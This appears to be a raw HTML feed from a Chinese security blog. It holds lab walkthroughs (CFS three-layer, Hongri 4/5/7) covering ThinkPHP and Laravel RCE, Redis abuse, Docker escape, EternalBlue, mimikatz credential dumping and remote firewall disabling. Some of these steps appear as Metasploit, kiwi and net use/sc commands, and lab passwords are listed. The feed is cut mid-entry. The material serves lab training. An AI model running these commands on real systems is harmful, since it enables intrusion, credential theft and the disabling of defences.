title="信息分析"></a>信息分析</h3><p><strong>服务信息收集</strong></p><p>网络服务：web&#x2F;ftp&#x2F;telnet&#x2F;ssh&#x2F;mail&#x2F;mysql&#x2F;mssql&#x2F;oracle&#x2F;rdp<br>服务版本，漏洞等相关信息收集<br>系统版本信息收集</p><hr><h3 id="网络设备信息收集"><a href="#网络设备信息收集" class="headerlink" title="网络设备信息收集"></a>网络设备信息收集</h3><p>网络开放端口<br>路由<br>防火墙<br>代理服务器等相关设备的收集<br>Shodan</p><hr><h3 id="后台查找"><a href="#后台查找" class="headerlink" title="后台查找"></a>后台查找</h3><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">弱口令默认后台：<span class="hljs-keyword">admin</span>，<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">login</span>.asp，manage，asp等<br><br>查找网页等链接：一般来说，网站等主页有管理登陆类似的东西，有些<br><br>查找网站图片的属性<br><br>查找网站使用的管理系统，从而确定后台<br><br>用工具查找：wwwscan，intellitamper，御剑<br><br>txt的帮助：robots.txt文件告诉蜘蛛程序中服务器上什么样的文件<br><br>Googlehacker<br><br>查看网站使用的编辑器上否有默认后台<br><br>短文件利用<br><br>sqlmap –<span class="hljs-keyword">sql</span>-shel load_file(‘d:/wwwroot/<span class="hljs-keyword">index</span>.php’)<br><br>找关联性信息<br><br>同一个建站商<br><br>同一个注册邮箱<br><br>同一个注册人<br><br>后台可能不在同一个站<br></code></pre></div></td></tr></table></figure><hr><h3 id="端口后台"><a href="#端口后台" class="headerlink" title="端口后台"></a><strong>端口后台</strong></h3><p><strong>子域名</strong><br><strong>Admin.baidu.com</strong></p><p><strong>System.baidu.com</strong></p><p><em>可能是完全独立的另一个域名</em><br><em>如果是同一个服务器可以查旁站</em></p><hr><h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><p><em>判断CDN（超级ping）</em></p><p>绕过：</p><p>查找二级域名、让服务器主动给你发包（邮件）、敏感目录泄漏、查询历史解析ip、访问绕过CDN（修改hosts文件）</p>]]></content>
    
    
    <categories>
      
      <category>渗透基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CFS三层靶机</title>
    <link href="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/"/>
    <url>/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h1><p>外网：centos7（宝塔）192.168.10.117（外）192.168.22.128（内）</p><p>二层：Ubuntu（二层）192.168.22.129（内IP1）192.168.33.128（内ip2）</p><p>三层：Windows7（三层）192.168.33.33（内ip3）</p><p>密码：teamssiy.com</p><p>外网开放端口 80 thinkphp</p><p>内网Ubuntu 需要配置宝塔，xdyhr37d:qwe123..</p><p>登录上去后，手动添加ip地址</p><h1 id="2、外网"><a href="#2、外网" class="headerlink" title="2、外网"></a>2、外网</h1><p>thinkPHP5.0，直接工具利用了</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110339041.png" alt="image-20240611110339041"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110343091.png" alt="image-20240611110343091"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110345943.png" alt="image-20240611110345943"></p><p>不是root权限，不管了，直接上线msf，开自动路由，然后上传fsan探测内网信息</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110348875.png" alt="image-20240611110348875"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110350970.png" alt="image-20240611110350970"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110353177.png" alt="image-20240611110353177"></p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110357738.png" alt="image-20240611110357738"></p><p>129设备一个CMS站点，设置用client隧道直接代理出来</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111626767.png" alt="image-20240611111626767"></p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111642715.png" alt="image-20240611111642715"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111639439.png" alt="image-20240611111639439"></p><p>访问成功</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111631198.png" alt="image-20240611111631198"></p><p>前端源码有个hint，上sqlmap注入，</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111644787.png" alt="image-20240611111644787"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111647815.png" alt="image-20240611111647815"></p><p>robots找到后台，sqlmap找到后台账密</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111651637.png" alt="image-20240611111651637"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111654528.png" alt="image-20240611111654528"></p><p>然后设置白名单，上传shell，模板上传，然后路由过去</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111657922.png" alt="image-20240611111657922"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111703071.png" alt="image-20240611111703071"></p><p>蚁剑设置代理，连shell</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111705856.png" alt="image-20240611111705856"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111709213.png" alt="image-20240611111709213"></p><p>使用msf生成一个正向连接的马（bind），上传，运行，自动获取路由，然后获取到第三层网段，fscan上传上去探测一下。</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111711677.png" alt="image-20240611111711677"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111714613.png" alt="image-20240611111714613"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111717582.png" alt="image-20240611111717582"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111720522.png" alt="image-20240611111720522"></p><p>存在永恒之蓝，用scanner探测一下，确定存在</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111723448.png" alt="image-20240611111723448"></p><p>然后使用psexec永恒之蓝，直接run，拿下三层</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111727218.png" alt="image-20240611111727218"></p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>三层靶机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（7）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A57/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A57/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h1><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234510066.png" alt="image-20240610234510066"></p><p><strong>域用户信息</strong></p><p>域用户账户和密码如下：</p><ul><li>Administrator：Whoami2021</li><li>whoami：Whoami2021</li><li>bunny：Bunny2021</li><li>moretz：Moretz2021</li></ul><p>Ubuntu 1：</p><ul><li>web：web2021</li></ul><p>Ubuntu 2：</p><ul><li>ubuntu：ubuntu</li></ul><p>通达OA账户：</p><ul><li>admin：admin65726</li></ul><h1 id="2、外网"><a href="#2、外网" class="headerlink" title="2、外网"></a>2、外网</h1><p>nmap开扫，版本，端口，在使用goby查看更详细内容，顺带扫一波漏洞</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234614013.png" alt="image-20240610234614013"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234622692.png" alt="image-20240610234622692"><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234624455.png" alt="image-20240610234624455"></p><p>存在一个laravelRCE漏洞，直接利用</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234627335.png" alt="image-20240610234627335"></p><p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234636408.png" alt="image-20240610234636408"></p><p><strong>这里使用哥斯拉连接，新版的哥斯拉无法连接，这里使用旧版哥斯拉</strong></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234639063.png" alt="image-20240610234639063"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234642179.png" alt="image-20240610234642179"></p><p>上线msf</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234645616.png" alt="image-20240610234645616"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234649872.png" alt="image-20240610234649872"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234653034.png" alt="image-20240610234653034"></p><p>根据刚刚搭建的靶机，这里是52.10也就是Ubuntu2的docker环境，所以并没有什么用处，根据信息收集的内容</p><h2 id="Ubuntu1"><a href="#Ubuntu1" class="headerlink" title="Ubuntu1"></a><strong>Ubuntu1</strong></h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>自带的后门（这里参考其他文章）</strong></p><p>查找后门文件</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234659916.png" alt="image-20240610234659916"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234705241.png" alt="image-20240610234705241"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234708374.png" alt="image-20240610234708374"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234711325.png" alt="image-20240610234711325"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234735048.png" alt="image-20240610234735048"></p><h3 id="绕过docker"><a href="#绕过docker" class="headerlink" title="绕过docker"></a><strong>绕过docker</strong></h3><p>看到确实拿到了root权限，接下来就是docker逃逸了</p><p>这里是docker特权模式逃逸，讲解一下就是现在的docker内的root权限允许拥有外部物理机的root权限，而在之前docker内的root只拥有外部的普通用户权限，而现在docker的root用户可以访问主机上的所有设备文件</p><p>所以这里fdisk -l 查看磁盘文件 ls &#x2F;dev 查看设备文件</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234752880.png" alt="image-20240610234752880"></p><p>去挂载一个文件</p><p>在docker容器里挂载一个宿主的本地目录，这样某些容器里输出的文件，就可以在本地目录中打开访问了。</p><p>这里发现里面的sda1是可以挂载的</p><p>我们先来到根目录下 cd &#x2F;</p><p>然后创建一个目录 mkdir guazai</p><p>随便取一个名字然后挂载这个&#x2F;dev&#x2F;sda1</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234812822.png" alt="image-20240610234812822"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234818291.png" alt="image-20240610234818291"></p><p>挂载成功，这样就可以通过访问&#x2F;guazai这个目录达到访问物理机</p><p>接下来可以写ssh公私钥，也可以直接写计划任务来反弹shell</p><p>那这里我都带大家尝试一遍吧</p><p>1.写入ssh公私钥我们要用第一台机子去写入所以来到第一台的ssh中</p><p>写入然后将密钥复制出来，然后在docker机子上先覆盖密钥</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234846516.png" alt="image-20240610234846516"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234852475.png" alt="image-20240610234852475"></p><p>avx可以将权限也一同复制</p><p>将authorized_keys文件清空</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234906783.png" alt="image-20240610234906783"></p><p>清空后将刚刚生成的公私钥写入</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234916474.png" alt="image-20240610234916474"></p><p>粘贴进去就可以了</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234950115.png" alt="image-20240610234950115"></p><p>cat一下确实写进去了</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235001095.png" alt="image-20240610235001095"></p><h2 id="Ubuntu2"><a href="#Ubuntu2" class="headerlink" title="Ubuntu2"></a>Ubuntu2</h2><p><strong>拿下Ubuntu2的机子，也就是存在docker的机子。</strong></p><h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a><strong>第一种方法</strong></h3><p>信息搜集，发现存在redis未授权访问，getshell，绕过docker，写一个ssh连接</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235019449.png" alt="image-20240610235019449"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235024428.png" alt="image-20240610235024428"></p><p>然后使用redis写入进去</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235029247.png" alt="image-20240610235029247"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235041811.png" alt="image-20240610235041811"></p><p><strong>连接成功</strong></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235045993.png" alt="image-20240610235045993"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235051963.png" alt="image-20240610235051963"></p><h3 id="第二种方法，绕过-docker"><a href="#第二种方法，绕过-docker" class="headerlink" title="第二种方法，绕过****docker"></a><strong>第二种方法，绕过****docker</strong></h3><figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">使用cve<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span><br><br>该漏洞（CVE<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span>）是2019年爆出的。在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，其允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。<br><br>利用该漏洞需要满足以下两个条件之一：<br><br>- •由一个攻击者控制的恶意镜像创建•攻击者具有某已存在容器的写权限，且可通过docker     exec进入。<br><br>首先下载攻击脚本： https://github.com/Frichetten/CVE<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span>-PoC<br><br>打开main.go脚本，将脚本中要在目标机上执行的命令修改为反弹shell的命令，IP为攻击机IP，端口为攻击机监听的端口：<br></code></pre></div></td></tr></table></figure><h3 id="特权模式绕过"><a href="#特权模式绕过" class="headerlink" title="特权模式绕过"></a>特权模式绕过</h3><p>挂载过去</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235152702.png" alt="image-20240610235152702"></p><p>………</p><p>绕过去也就是Ubuntu2的机子</p><p>redis，拿到Ubuntu用户后，然后上传一个马，上线msf</p><p>传到81端口，wget下载，打开上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235212614.png" alt="image-20240610235212614"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235216941.png" alt="image-20240610235216941"></p><p>不是docker了</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235230923.png" alt="image-20240610235230923"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235236708.png" alt="image-20240610235236708"></p><h1 id="3、内网"><a href="#3、内网" class="headerlink" title="3、内网"></a>3、内网</h1><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235843033.png" alt="image-20240610235843033"></p><p>这里10（Ubuntu1）和20（Ubuntu2）都已经拿下了，剩下一个30的，发现是通达OA</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000109643.png" alt="image-20240611000109643"></p><p>通达OA，直接利用前台的getshell洞，使用chisel搭建内网隧道，然后proxychains代理，火狐访问</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000122667.png" alt="image-20240611000122667"></p><p>利用此漏洞，这里代理出来，使用burp设置代理</p><p>然后开始复现漏洞</p><p><a href="https://blog.csdn.net/szgyunyun/article/details/107104288">https://blog.csdn.net/szgyunyun/article/details/107104288</a></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000208606.png" alt="image-20240611000208606"></p><p>构造危险代码图片文件</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000227184.png" alt="image-20240611000227184"></p><p>使用文件包含，命令执行成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000233035.png" alt="image-20240611000233035"></p><p>使用msf生成一个木马，这里需要使用正向链接payload，也就是不通过木马寻找msf，而是msf寻找木马，然后在10（Ubuntu1）那台上将马上传上去，然后使用Windows自带的certutil指令下载此文件，msf开始监听，运行上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000337717.png" alt="image-20240611000337717"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000342119.png" alt="image-20240611000342119"></p><p>也可以使用永恒之蓝拿下30</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhost 192.168.52.30<br><span class="hljs-built_in">set</span> RPORT 445<br><span class="hljs-built_in">set</span> lport 8526<br>setg Proxies socks5:127.0.0.1:9999<br>setg ReverseAllowProxy <span class="hljs-literal">true</span><br>run<br></code></pre></div></td></tr></table></figure><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000818403.png" alt="image-20240611000818403"></p><p>内网信息</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000832720.png" alt="image-20240611000832720"></p><p>上传fscan查看具体信息</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000843871.png" alt="image-20240611000843871"></p><p>这里有一个问题，就是使用load kiwi的时候执行这些命令报错的话，<strong>将其注入到其他进程中</strong></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000848264.png" alt="image-20240611000848264"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000939978.png" alt="image-20240611000939978"></p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">load kiwi<br>kiwi_cmd privilege::debug<br>kiwi_cmd sekurlsa::logonPasswords<br></code></pre></div></td></tr></table></figure><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001045161.png" alt="image-20240611001045161"></p><p>密码，包括域控制器的，域开启着防火墙，将其关闭</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001100498.png" alt="image-20240611001100498"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001121934.png" alt="image-20240611001121934"></p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> [\\192.168.93.30\ipc$](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30/ipc$) &quot;Whoami2021&quot; /user:&quot;Administrator&quot;</span><br><br><span class="hljs-keyword">sc</span> [\\192.168.93.30](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30) create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><br><span class="hljs-keyword">sc</span> [\\192.168.93.30](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30) start unablefirewall</span><br></code></pre></div></td></tr></table></figure><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001135466.png" alt="image-20240611001135466"></p><p>关闭防火墙成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001204246.png" alt="image-20240611001204246"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001226294.png" alt="image-20240611001226294"></p><p>永恒之蓝第二天就连不上了。。。。不清楚什么情况。。。。但是一般是在使用Windows7在93网段，然后使用以上方法关闭域的防火墙，然后使用永恒之蓝就可以拿下了，不过这里环境一直有问题。。。😭😭😭😭</p>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（5）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A55/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A55/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h1><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233721335.png" alt="image-20240610233721335"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233726073.png" alt="image-20240610233726073"></p><h1 id="2、环境搭建"><a href="#2、环境搭建" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h1><p>端口+漏洞扫描，发现存在thinkPHP漏洞</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233750090.png" alt="image-20240610233750090"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233754007.png" alt="image-20240610233754007"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233758453.png" alt="image-20240610233758453"></p><p>直接使用利用工具，getshell</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233804887.png" alt="image-20240610233804887"></p><p>蚁剑连接</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233830037.png" alt="image-20240610233830037"></p><p>上线msf</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233848273.png" alt="image-20240610233848273"></p><p>设置监听，成功上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233857407.png" alt="image-20240610233857407"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233916111.png" alt="image-20240610233916111"></p><p>成功内网ip，有个138.138网络</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233939119.png" alt="image-20240610233939119"></p><p>msf查看域用户</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233957452.png" alt="image-20240610233957452"></p><h1 id="3、内网"><a href="#3、内网" class="headerlink" title="3、内网"></a>3、内网</h1><p>这里换一个用使用leo用户impersonate_toke切换</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234027496.png" alt="image-20240610234027496"></p><p>进入shell</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234044238.png" alt="image-20240610234044238"></p><p>开启自动路由</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234051645.png" alt="image-20240610234051645"></p><p>检测永恒之蓝，存在</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234057953.png" alt="image-20240610234057953"></p><p>获取leo的system权限，失败</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234104144.png" alt="image-20240610234104144"></p><p>这里先获取admin权限，在获取system权限，使用msf自带的模块</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234111370.png" alt="image-20240610234111370"></p><p>查看域用户，域账户dc.sun.com，ping，发现域控制器</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234117398.png" alt="image-20240610234117398"></p><p>关闭防火墙</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234206575.png" alt="image-20240610234206575"></p><p>打开隧道</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234213973.png" alt="image-20240610234213973"></p><p>Load_kiw</p><p>Creds_all</p><p>查看密文密码</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234227311.png" alt="image-20240610234227311"></p><p><strong>Psexec 攻击</strong></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234237264.png" alt="image-20240610234237264"></p><p>但是一直攻击失败，放弃使用psexec，上线cs看看</p><p>使用payload注入，监听reverse_http然后CS也同理，IP和端口一致</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234245869.png" alt="image-20240610234245869"></p><p>掏出wmiexec试试，成功了。。。。域拿下</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234255621.png" alt="image-20240610234255621"></p>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全 靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（4）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A54/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A54/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h1><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610125908734.png" alt="image-20240610125908734"></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">拿出一张网卡配183网段，然后仅主机模式<br>然后web机器做一些配置<br>先进入ubuntu启动web,开启3个环境<br><span class="hljs-built_in">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045<br><span class="hljs-built_in">sudo</span> docker-compose up -d<br><span class="hljs-built_in">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/<br><span class="hljs-built_in">sudo</span> docker-compose up -d<br><span class="hljs-built_in">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/<br><span class="hljs-built_in">sudo</span> docker-compose up -d<br></code></pre></div></td></tr></table></figure><h1 id="2、外网"><a href="#2、外网" class="headerlink" title="2、外网"></a>2、外网</h1><p>信息收集，外网开放4个端口，整理</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130012215.png" alt="image-20240610130012215"></p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-number">2001</span><span class="hljs-number">-2003</span><br><br><span class="hljs-number">2001</span><span class="hljs-string">：status</span><br><br><span class="hljs-number">2002</span><span class="hljs-string">：tomcat</span><br><br><span class="hljs-number">2003</span><span 